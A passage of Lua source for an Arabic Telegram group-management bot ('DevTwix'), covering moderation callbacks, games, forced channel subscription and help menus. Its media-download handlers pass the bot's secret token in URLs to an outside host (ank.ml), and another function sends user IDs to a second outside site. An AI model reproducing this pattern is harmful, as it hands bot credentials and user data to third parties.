if dp.first_name_ ~= false then
local UserName = (dp.username_ or "DevTwix")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عذرا عزيزي » ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙العضو » ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙بواسطة » ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
---------------------------------------------------------------------------------------
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
HmD = GetInfo.result.custom_title
else 
HmD = Status
end
end
return HmD
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'⋄︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'⋄︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'⋄︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'⋄︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙حذف الرسائل » '..DEL..'\n⋄︙دعوة المستخدمين » '..INV..'\n⋄︙حظر المستخدمين » '..BAN..'\n⋄︙تثبيت الرسائل » '..PIN..'\n⋄︙تغيير المعلومات » '..EDT..'\n⋄︙اضافة مشرفين » '..VIP..'\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••')
end
end
end
---------------------------------------------------------------------------------------
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
HmD = GetInfo.result.bio
else 
HmD = "لا يوجد"
end
end
return HmD
end
---------------------------------------------------------------------------------------
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
---------------------------------------------------------------------------------------
function HmDmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevHmD:get(DevTwix..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
---------------------------------------------------------------------------------------
function ChTwixDev(msg) 
local url,res = https.request('https://anashtick.ml/TwixTeAm/TX.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.DevTwix ~= true then
Var = false
Text = "⋄︙*عذرا لاتستطيع استخدام البوت !\n⋄︙عليك الاشتراك في قناة السورس اولاً :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="᥀ 𝗧𝗲𝗮𝗠 𝗧𝘄𝗶𝘅 ˛",url="t.me/DevTwix"}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
end
---------------------------------------------------------------------------------------
function ChCheck(msg)
local var = true 
if DevHmD:get(DevTwix.."HmD:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevHmD:get(DevTwix..'HmD:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevHmD:get(DevTwix..'HmD:ChText') then
local ChText = DevHmD:get(DevTwix..'HmD:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevHmD:get(DevTwix.."HmD:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "⋄︙*عذرا لاتستطيع استخدام البوت !\n⋄︙عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
---------------------------------------------------------------------------------------
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevHmD:get(DevTwix..'yes'..data.sender_user_id_) == 'delyes' then
DevHmD:del(DevTwix..'yes'..data.sender_user_id_, 'delyes')
DevHmD:del(DevTwix..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⋄︙لا استطيع طرد » "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "⋄︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "⋄︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevHmD:get(DevTwix..'no'..data.sender_user_id_) == 'delno' then
DevHmD:del(DevTwix..'yes'..data.sender_user_id_, 'delyes')
DevHmD:del(DevTwix..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم الغاء امر اطردني") 
end
---------------------------------------------------------------------------------------
if DataText == '/yesdel' and DevHmD:get(DevTwix..'yesdel'..data.sender_user_id_) == 'delyes' then
DevHmD:del(DevTwix..'yesdel'..data.sender_user_id_, 'delyes')
DevHmD:del(DevTwix..'nodel'..data.sender_user_id_, 'delno')
if DevHmD:sismember(DevTwix..'HmD:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevHmD:sismember(DevTwix..'HmD:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevHmD:sismember(DevTwix..'HmD:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevHmD:sismember(DevTwix..'HmD:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevHmD:sismember(DevTwix..'HmD:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevHmD:sismember(DevTwix..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevHmD:sismember(DevTwix..'HmD:Constructor:'..data.chat_id_, data.sender_user_id_) or DevHmD:sismember(DevTwix..'HmD:Managers:'..data.chat_id_, data.sender_user_id_) or DevHmD:sismember(DevTwix..'HmD:Admins:'..data.chat_id_, data.sender_user_id_) or DevHmD:sismember(DevTwix..'HmD:VipMem:'..data.chat_id_, data.sender_user_id_) or DevHmD:sismember(DevTwix..'HmD:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevHmD:sismember(DevTwix..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevHmD:srem(DevTwix..'HmD:Constructor:'..data.chat_id_,data.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..data.chat_id_,data.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..data.chat_id_,data.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..data.chat_id_,data.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevHmD:srem(DevTwix..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم تنزيلك من » \n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "⋄︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "⋄︙لا استطيع تنزيل » "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevHmD:get(DevTwix.."HmD:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم الغاء امر تغير المطور الاساسي") 
DevHmD:del(DevTwix.."HmD:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevHmD:get(DevTwix.."HmD:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "⋄︙المطور الجديد » ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⋄︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"⋄︙بواسطة » ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⋄︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
DevTwix = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevHmD:del(DevTwix.."HmD:NewDev"..data.sender_user_id_)
dofile('DevTwix.lua') 
end
end
if DataText == '/nodel' and DevHmD:get(DevTwix..'nodel'..data.sender_user_id_) == 'delno' then
DevHmD:del(DevTwix..'yesdel'..data.sender_user_id_, 'delyes')
DevHmD:del(DevTwix..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevHmD:get(DevTwix.."HmD:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevHmD:smembers(DevTwix..'HmD:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevHmD:del(DevTwix..'HmD:ListRolet'..data.chat_id_) 
DevHmD:del(DevTwix.."HmD:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⋄︙*صاحب الحظ* » ["..UserName.."]\n⋄︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevHmD:del(DevTwix..'HmD:ListRolet'..data.chat_id_) 
DevHmD:del(DevTwix.."HmD:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevHmD:del(DevTwix.."HmD:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevHmD:smembers(DevTwix..'HmD:ListRolet'..data.chat_id_) 
local Text = '⋄︙قائمة الاعبين » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n' 
local Textt = '•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevHmD:sismember(DevTwix..'HmD:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevHmD:srem(DevTwix..'HmD:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ank.ml/Yotube/sngh.php?search=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ank.ml/Yotube/sngh.php?search=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ank.ml/Yotube/sngh.php?search=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ank.ml/Yotube/sngh.php?search=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local HmD = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "⋄︙الكلمه » "..HmD.." تم حذفها") 
DevHmD:del(DevTwix..'HmD:Text:GpTexts'..HmD..data.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRedod'..data.chat_id_,HmD)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local HmD = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevHmD:smembers(DevTwix..'HmD:Text:GpTexts'..HmD..data.chat_id_)
if DevHmD:get(DevTwix..'HmD:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم انهاء وحفظ » "..#List.." من الردود المتعدده للامر » "..HmD) 
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "⋄︙*عذرا صلاحية الامر منتهيه !.*") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local HmD = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevHmD:get(DevTwix..'HmD:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⋄︙تم الغاء عملية حفظ الردود المتعدده للامر » "..HmD) 
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevHmD:del(DevTwix..'HmD:Text:GpTexts'..HmD..data.chat_id_)
DevHmD:del(DevTwix..'HmD:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRedod'..data.chat_id_,HmD)
else
EditMsg(Chat_Id2, Msg_Id2, "⋄︙*عذرا صلاحية الامر منتهيه !.*") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local HmD = DataText:match('/HideHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⋄︙*عزيزي تم اخفاء الكليشة .*") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/AddHelpList:(.*)') then
local HmD = DataText:match('/AddHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2,"⋄︙*تم تفعيل البوت في المجموعة*")  
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/DelHelpList:(.*)') then
local HmD = DataText:match('/DelHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2,"⋄︙*تم تعطيل البوت في المجموعة*")  
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
------------------------------------------------------------------
if DataText and DataText:match('/TLHelpList:(.*)') then
local HmD = DataText:match('/TLHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Text = [[*
⋄︙رابط حذف موقع التليكرام :
⋄︙اضغط على الرابط لحذف الحساب :

Link : https://my.telegram.org/auth?to=delete
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
------------------------------------------------------------------
if DataText and DataText:match('/FseHelpList:(.*)') then
local HmD = DataText:match('/FseHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Text = [[*
⋄︙رابط حذف موقع الفيسبوك :
⋄︙اضغط على الرابط لحذف الحساب :

Link : https://www.facebook.com/help/deleteaccount
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
------------------------------------------------------------------
if DataText and DataText:match('/ineHelpList:(.*)') then
local HmD = DataText:match('/ineHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Text = [[*
⋄︙رابط حذف موقع الانستكرام :
⋄︙اضغط على الرابط لحذف الحساب :

Link : https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
------------------------------------------------------------------
if DataText and DataText:match('/SneHelpList:(.*)') then
local HmD = DataText:match('/SneHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
local Text = [[*
⋄︙رابط حذف موقع الاسناب شات :
⋄︙اضغط على الرابط لحذف الحساب :

Link : https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
------------------------------------------------------------------
if DataText and DataText:match('/DevHelpList:(.*)') then
local HmD = DataText:match('/DevHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,result)
Text = "\n*⋄︙معلومات حول مطور البوت : *\n⋄︙الايدي : `"..DevId.."`\n⋄︙المعرف : [@"..result.username_.."]\n⋄︙الاسم : "..result.first_name_.."\n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯\n⋄︙Cahnnel Source : @DevTwix\n"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• رجوع •",callback_data="/BackHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end end
------------------------------------------------------------------
if DataText and DataText:match('/BackHelpList:(.*)') then
local HmD = DataText:match('/BackHelpList:(.*)')
if tonumber(HmD) == tonumber(data.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكس') 
local Text = "\n⋄︙مرحبأَ انا بوت إسمي "..NameBot.." 🧞‍♀️\n⋄︙لحماية المجموعات من السبام والتفليش والخ...\n⋄︙اضفني الى مجموعاتك {مشرف} ثم ارسل تفعيل\n\n⋄︙آرسل إمر { /Game } للعب دخل آلبوت . \n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n⋄︙[Channel Source DevTwix](t.me/devtwix) ."
keyboard = {} 
